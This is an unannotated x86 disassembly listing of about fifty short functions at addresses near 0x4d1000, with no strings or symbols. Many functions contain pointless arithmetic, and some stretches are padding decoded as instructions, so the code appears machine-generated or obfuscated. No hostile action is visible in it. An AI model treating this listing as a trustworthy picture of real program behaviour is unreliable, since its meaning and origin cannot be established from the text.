  4d109a:	push   esi
  4d109b:	push   DWORD PTR [edx+0x19c]
  4d10a1:	push   DWORD PTR [edx+0x5c]
  4d10a4:	call   0x4d11b4
  4d10a9:	add    esp,0xc
  4d10ac:	pop    edx
  4d10ad:	push   edx
  4d10ae:	lea    edx,[edx-0x74]
  4d10b1:	push   edx
  4d10b2:	call   0x4d10d0
  4d10b7:	add    esp,0x4
  4d10ba:	test   eax,eax
  4d10bc:	jne    0x4d10ae
  4d10be:	pop    edx
  4d10bf:	add    esp,0x3c
  4d10c2:	pop    ebp
  4d10c3:	ret    
  4d10c4:	pop    edi
  4d10c5:	call   DWORD PTR ds:0x4d205c
  4d10cb:	call   edi
  4d10cd:	add    BYTE PTR [eax],al
  4d10cf:	add    BYTE PTR [edi-0x1],bl
  4d10d2:	adc    eax,0x4d2014
  4d10d7:	call   edi
  4d10d9:	add    BYTE PTR [eax],al
  4d10db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10e1:	sub    esp,0x24
  4d10e4:	mov    esi,0x4d315c
  4d10e9:	mov    DWORD PTR [esi-0xc8],esi
  4d10ef:	push   esi
  4d10f0:	push   DWORD PTR [esi+0x5c]
  4d10f3:	push   edx
  4d10f4:	call   0x4d0868
  4d10f9:	add    esp,0x8
  4d10fc:	pop    esi
  4d10fd:	mov    edx,0x0
  4d1102:	push   edx
  4d1103:	call   0x4d0e3c
  4d1108:	add    esp,0x4
  4d110b:	push   0x0
  4d110d:	call   0x4d0a0c
  4d1112:	add    esp,0x4
  4d1115:	add    esp,0x24
  4d1118:	pop    ebp
  4d1119:	ret    
  4d111a:	add    BYTE PTR [eax],al
  4d111c:	mov    edi,edi
  4d111e:	push   ebp
  4d111f:	mov    ebp,esp
  4d1121:	sub    esp,0x4c
  4d1124:	lea    eax,ds:0x4d3020
  4d112a:	adc    DWORD PTR [ebp-0x34],0x5a
  4d112e:	push   eax
  4d112f:	push   DWORD PTR [eax+0x1e8]
  4d1135:	push   esi
  4d1136:	push   edx
  4d1137:	call   0x4d107c
  4d113c:	add    esp,0xc
  4d113f:	pop    eax
  4d1140:	push   eax
  4d1141:	mov    ebx,0x0
  4d1146:	push   ebx
  4d1147:	call   0x4d0d4c
  4d114c:	add    esp,0x4
  4d114f:	pop    eax
  4d1150:	push   eax
  4d1151:	mov    esi,0x0
  4d1156:	push   esi
  4d1157:	call   0x4d08fc
  4d115c:	add    esp,0x4
  4d115f:	pop    eax
  4d1160:	add    esp,0x4c
  4d1163:	pop    ebp
  4d1164:	ret    
  4d1165:	add    BYTE PTR [eax],al
  4d1167:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d116d:	sub    esp,0x3c
  4d1170:	mov    eax,0x4d306c
  4d1175:	sub    edi,0x7b4e
  4d117b:	push   eax
  4d117c:	push   edi
  4d117d:	push   DWORD PTR [eax+0x1b8]
  4d1183:	push   DWORD PTR [eax+0x1ac]
  4d1189:	call   0x4d0db0
  4d118e:	add    esp,0xc
  4d1191:	pop    eax
  4d1192:	push   eax
  4d1193:	push   0x0
  4d1195:	call   0x4d0d4c
  4d119a:	add    esp,0x4
  4d119d:	pop    eax
  4d119e:	push   eax
  4d119f:	mov    ebx,0x0
  4d11a4:	push   ebx
  4d11a5:	call   0x4d0a60
  4d11aa:	add    esp,0x4
  4d11ad:	pop    eax
  4d11ae:	add    esp,0x3c
  4d11b1:	pop    ebp
  4d11b2:	ret    
  4d11b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11b9:	sub    esp,0x28
  4d11bc:	lea    edi,ds:0x4d31d0
  4d11c2:	xor    edx,0x15
  4d11c5:	push   edi
  4d11c6:	push   ecx
  4d11c7:	push   eax
  4d11c8:	call   0x4d0ca4
  4d11cd:	add    esp,0x8
  4d11d0:	pop    edi
  4d11d1:	push   edi
  4d11d2:	push   0x0
  4d11d4:	call   0x4d1070
  4d11d9:	add    esp,0x4
  4d11dc:	pop    edi
  4d11dd:	push   edi
  4d11de:	mov    edi,0x0
  4d11e3:	push   edi
  4d11e4:	call   0x4d1070
  4d11e9:	add    esp,0x4
  4d11ec:	pop    edi
  4d11ed:	add    esp,0x28
  4d11f0:	pop    ebp
  4d11f1:	ret    
  4d11f2:	add    BYTE PTR [eax],al
  4d11f4:	mov    edi,edi
  4d11f6:	push   ebp
  4d11f7:	mov    ebp,esp
  4d11f9:	sub    esp,0x40
  4d11fc:	mov    eax,0x4d30ac
  4d1201:	xor    DWORD PTR [ebp-0x30],0x63
  4d1205:	push   eax
  4d1206:	push   0x0
  4d1208:	call   0x4d1570
  4d120d:	add    esp,0x4
  4d1210:	pop    eax
  4d1211:	push   eax
  4d1212:	push   DWORD PTR [eax+0x1f4]
  4d1218:	push   DWORD PTR [eax+0x10]
  4d121b:	push   DWORD PTR [eax+0x18]
  4d121e:	call   0x4d13b4
  4d1223:	add    esp,0xc
  4d1226:	pop    eax
  4d1227:	push   eax
  4d1228:	mov    esi,0x0
  4d122d:	push   esi
  4d122e:	call   0x4d1570
  4d1233:	add    esp,0x4
  4d1236:	pop    eax
  4d1237:	add    esp,0x40
  4d123a:	pop    ebp
  4d123b:	ret    
  4d123c:	mov    edi,edi
  4d123e:	push   ebp
  4d123f:	mov    ebp,esp
  4d1241:	sub    esp,0x2c
  4d1244:	lea    ecx,ds:0x4d30b8
  4d124a:	sbb    edx,0x47
  4d124d:	push   ecx
  4d124e:	mov    eax,0x0
  4d1253:	push   eax
  4d1254:	call   0x4d1070
  4d1259:	add    esp,0x4
  4d125c:	pop    ecx
  4d125d:	push   ecx
  4d125e:	push   DWORD PTR [ecx+0x198]
  4d1264:	push   edx
  4d1265:	push   edx
  4d1266:	call   0x4d12f0
  4d126b:	add    esp,0xc
  4d126e:	pop    ecx
  4d126f:	push   ecx
  4d1270:	mov    ebx,0x0
  4d1275:	push   ebx
  4d1276:	call   0x4d0d4c
  4d127b:	add    esp,0x4
  4d127e:	pop    ecx
  4d127f:	add    esp,0x2c
  4d1282:	pop    ebp
  4d1283:	ret    
  4d1284:	pop    edi
  4d1285:	call   DWORD PTR ds:0x4d209c
  4d128b:	call   edi
  4d128d:	add    BYTE PTR [eax],al
  4d128f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1295:	sub    esp,0x48
  4d1298:	lea    eax,[edx-0xa8]
  4d129e:	add    DWORD PTR [ebp-0x20],0xffffe8b2
  4d12a5:	push   eax
  4d12a6:	mov    eax,0x0
  4d12ab:	push   eax
  4d12ac:	call   0x4d0ce4
  4d12b1:	add    esp,0x4
  4d12b4:	pop    eax
  4d12b5:	push   eax
  4d12b6:	push   DWORD PTR [eax+0x1d8]
  4d12bc:	push   ebx
  4d12bd:	call   0x4d123c
  4d12c2:	add    esp,0x8
  4d12c5:	pop    eax
  4d12c6:	push   eax
  4d12c7:	push   0x0
  4d12c9:	call   0x4d0a60
  4d12ce:	add    esp,0x4
  4d12d1:	pop    eax
  4d12d2:	add    esp,0x48
  4d12d5:	pop    ebp
  4d12d6:	ret    
  4d12d7:	add    BYTE PTR [edi-0x1],bl
  4d12da:	adc    eax,0x4d2000
  4d12df:	call   edi
  4d12e1:	add    BYTE PTR [eax],al
  4d12e3:	add    BYTE PTR [edi-0x1],bl
  4d12e6:	adc    eax,0x4d2098
  4d12eb:	call   edi
  4d12ed:	add    BYTE PTR [eax],al
  4d12ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12f5:	sub    esp,0x20
  4d12f8:	lea    eax,ds:0x4d3188
  4d12fe:	sbb    DWORD PTR [eax+0x5c],ebx
  4d1301:	push   eax
  4d1302:	push   0x0
  4d1304:	call   0x4d0b1c
  4d1309:	add    esp,0x4
  4d130c:	pop    eax
  4d130d:	push   eax
  4d130e:	push   ecx
  4d130f:	push   DWORD PTR [eax+0x10c]
  4d1315:	call   0x4d1330
  4d131a:	add    esp,0x8
  4d131d:	pop    eax
  4d131e:	push   eax
  4d131f:	push   0x0
  4d1321:	call   0x4d1570
  4d1326:	add    esp,0x4
  4d1329:	pop    eax
  4d132a:	add    esp,0x20
  4d132d:	pop    ebp
  4d132e:	ret    
  4d132f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1335:	sub    esp,0x50
  4d1338:	lea    esi,ds:0x4d31a4
  4d133e:	sbb    edi,DWORD PTR [ebp-0x38]
  4d1341:	push   esi
  4d1342:	push   DWORD PTR [esi+0xe8]
  4d1348:	push   edx
  4d1349:	push   ebx
  4d134a:	push   edx
  4d134b:	call   0x4d0cf0
  4d1350:	add    esp,0x10
  4d1353:	pop    esi
  4d1354:	push   0x0
  4d1356:	call   0x4d0e3c
  4d135b:	add    esp,0x4
  4d135e:	push   0x0
  4d1360:	call   0x4d0b1c
  4d1365:	add    esp,0x4
  4d1368:	add    esp,0x50
  4d136b:	pop    ebp
  4d136c:	ret    
  4d136d:	add    BYTE PTR [eax],al
  4d136f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1375:	sub    esp,0x24
  4d1378:	lea    edx,[eax-0x1a8]
  4d137e:	add    esi,DWORD PTR [ebp-0x1c]
  4d1381:	push   edx
  4d1382:	push   DWORD PTR [edx+0x110]
  4d1388:	push   ecx
  4d1389:	push   eax
  4d138a:	call   0x4d0a6c
  4d138f:	add    esp,0xc
  4d1392:	pop    edx
  4d1393:	push   edx
  4d1394:	mov    esi,0x0
  4d1399:	push   esi
  4d139a:	call   0x4d0b28
  4d139f:	add    esp,0x4
  4d13a2:	pop    edx
  4d13a3:	push   edx
  4d13a4:	push   0x0
  4d13a6:	call   0x4d0ce4
  4d13ab:	add    esp,0x4
  4d13ae:	pop    edx
  4d13af:	add    esp,0x24
  4d13b2:	pop    ebp
  4d13b3:	ret    
  4d13b4:	mov    edi,edi
  4d13b6:	push   ebp
  4d13b7:	mov    ebp,esp
  4d13b9:	sub    esp,0x1c
  4d13bc:	lea    edx,[eax+0x3c]
  4d13bf:	cmp    edx,0x3fa9
  4d13c5:	jb     0x4d13b7
  4d13c7:	push   edx
  4d13c8:	call   0x4d0c98
  4d13cd:	add    esp,0x4
  4d13d0:	pop    edx
  4d13d1:	push   edx
  4d13d2:	push   ecx
  4d13d3:	push   esi
  4d13d4:	push   DWORD PTR [edx+0x118]
  4d13da:	call   0x4d1498
  4d13df:	add    esp,0xc
  4d13e2:	pop    edx
  4d13e3:	push   edx
  4d13e4:	push   0x0
  4d13e6:	call   0x4d1570
  4d13eb:	add    esp,0x4
  4d13ee:	pop    edx
  4d13ef:	add    esp,0x1c
  4d13f2:	pop    ebp
  4d13f3:	ret    
  4d13f4:	mov    edi,edi
  4d13f6:	push   ebp
  4d13f7:	mov    ebp,esp
  4d13f9:	sub    esp,0x20
  4d13fc:	lea    eax,[edx-0x4]
  4d13ff:	and    DWORD PTR [eax+0x158],edi
  4d1405:	push   eax
  4d1406:	mov    ebx,0x0
  4d140b:	push   ebx
  4d140c:	call   0x4d1570
  4d1411:	add    esp,0x4
  4d1414:	pop    eax
  4d1415:	push   eax
  4d1416:	push   DWORD PTR [eax+0x44]
  4d1419:	push   esi
  4d141a:	call   0x4d0b40
  4d141f:	add    esp,0x8
  4d1422:	pop    eax
  4d1423:	push   eax
  4d1424:	push   0x0
  4d1426:	call   0x4d0b28
  4d142b:	add    esp,0x4
  4d142e:	pop    eax
  4d142f:	add    esp,0x20
  4d1432:	pop    ebp
  4d1433:	ret    
  4d1434:	pop    edi
  4d1435:	call   DWORD PTR ds:0x4d204c
  4d143b:	call   edi
  4d143d:	add    BYTE PTR [eax],al
  4d143f:	add    BYTE PTR [edi-0x1],bl
  4d1442:	adc    eax,0x4d206c
  4d1447:	call   edi
  4d1449:	add    BYTE PTR [eax],al
  4d144b:	add    BYTE PTR [edi-0x1],bl
  4d144e:	adc    eax,0x4d2010
  4d1453:	call   edi
  4d1455:	add    BYTE PTR [eax],al
  4d1457:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d145d:	sub    esp,0x28
  4d1460:	lea    eax,[edx+0x54]
  4d1463:	and    ecx,DWORD PTR [eax-0x140]
  4d1469:	push   eax
  4d146a:	push   edi
  4d146b:	push   DWORD PTR [eax+0x154]
  4d1471:	push   DWORD PTR [eax+0x8]
  4d1474:	call   0x4d1370
  4d1479:	add    esp,0xc
  4d147c:	pop    eax
  4d147d:	push   eax
  4d147e:	push   0x0
  4d1480:	call   0x4d1070
  4d1485:	add    esp,0x4
  4d1488:	pop    eax
  4d1489:	push   eax
  4d148a:	call   0x4d1434
  4d148f:	add    esp,0x4
  4d1492:	pop    eax
  4d1493:	add    esp,0x28
  4d1496:	pop    ebp
  4d1497:	ret    
  4d1498:	mov    edi,edi
  4d149a:	push   ebp
  4d149b:	mov    ebp,esp
  4d149d:	sub    esp,0x1c
  4d14a0:	lea    eax,[edx-0x14]
  4d14a3:	add    esi,DWORD PTR [eax-0x7c]
  4d14a6:	push   eax
  4d14a7:	push   DWORD PTR [eax+0x11c]
  4d14ad:	push   DWORD PTR [eax+0xac]
  4d14b3:	call   0x4d0b84
  4d14b8:	add    esp,0x8
  4d14bb:	pop    eax
  4d14bc:	push   eax
  4d14bd:	mov    edx,0xfffffff4
  4d14c2:	push   edx
  4d14c3:	call   0x4d09b8
  4d14c8:	add    esp,0x4
  4d14cb:	pop    eax
  4d14cc:	push   eax
  4d14cd:	mov    edi,0x0
  4d14d2:	push   edi
  4d14d3:	call   0x4d08fc
  4d14d8:	add    esp,0x4
  4d14db:	pop    eax
  4d14dc:	add    esp,0x1c
  4d14df:	pop    ebp
  4d14e0:	ret    
  4d14e1:	add    BYTE PTR [eax],al
  4d14e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14e9:	sub    esp,0x38
  4d14ec:	lea    ecx,ds:0x4d30a8
  4d14f2:	add    DWORD PTR [ebp-0x8],0x9
  4d14f6:	push   ecx
  4d14f7:	push   0x0
  4d14f9:	call   0x4d08fc
  4d14fe:	add    esp,0x4
  4d1501:	pop    ecx
  4d1502:	push   ecx
  4d1503:	push   DWORD PTR [ecx+0x1dc]
  4d1509:	push   edx
  4d150a:	push   edx
  4d150b:	call   0x4d07d8
  4d1510:	add    esp,0xc
  4d1513:	pop    ecx
  4d1514:	push   ecx
  4d1515:	lea    edx,[ecx-0xa8]
  4d151b:	push   edx
  4d151c:	call   0x4d10d0
  4d1521:	add    esp,0x4
  4d1524:	test   eax,eax
  4d1526:	jne    0x4d1515
  4d1528:	pop    ecx
  4d1529:	add    esp,0x38
  4d152c:	pop    ebp
  4d152d:	ret    
  4d152e:	add    BYTE PTR [eax],al
  4d1530:	mov    edi,edi
  4d1532:	push   ebp
  4d1533:	mov    ebp,esp
  4d1535:	sub    esp,0x20
  4d1538:	lea    eax,[edx-0x11c]
  4d153e:	sub    ecx,DWORD PTR [ebp-0x14]
  4d1541:	push   eax
  4d1542:	push   edx
  4d1543:	push   DWORD PTR [eax+0x48]
  4d1546:	push   ecx
  4d1547:	push   DWORD PTR [eax+0x18c]
  4d154d:	call   0x4d0df8
  4d1552:	add    esp,0x10
  4d1555:	pop    eax
  4d1556:	push   eax
  4d1557:	call   0x4d1434
  4d155c:	add    esp,0x4
  4d155f:	pop    eax
  4d1560:	push   eax
  4d1561:	call   0x4d0c98
  4d1566:	add    esp,0x4
  4d1569:	pop    eax
  4d156a:	add    esp,0x20
  4d156d:	pop    ebp
  4d156e:	ret    
  4d156f:	add    BYTE PTR [edi-0x1],bl
  4d1572:	adc    eax,0x4d2040
  4d1577:	call   edi
  4d1579:	add    BYTE PTR [eax],al
  4d157b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1581:	sub    esp,0x34
  4d1584:	mov    edx,0x4d30b0
  4d1589:	xor    DWORD PTR [edx-0x70],0x28de
  4d1590:	push   edx
  4d1591:	push   ecx
  4d1592:	push   DWORD PTR [edx+0x50]
  4d1595:	call   0x4d1290
  4d159a:	add    esp,0x8
  4d159d:	pop    edx
  4d159e:	push   edx
  4d159f:	mov    edx,0xfffffff4
  4d15a4:	push   edx
  4d15a5:	call   0x4d09b8
  4d15aa:	add    esp,0x4
  4d15ad:	pop    edx
  4d15ae:	push   edx
  4d15af:	lea    ecx,[edx-0xb0]
  4d15b5:	push   ecx
  4d15b6:	call   0x4d10d0
  4d15bb:	add    esp,0x4
  4d15be:	test   eax,eax
  4d15c0:	jne    0x4d15af
  4d15c2:	pop    edx
  4d15c3:	add    esp,0x34
  4d15c6:	pop    ebp
  4d15c7:	ret    
  4d15c8:	pop    edi
  4d15c9:	call   DWORD PTR ds:0x4d2094
  4d15cf:	call   edi
  4d15d1:	add    BYTE PTR [eax],al
	...
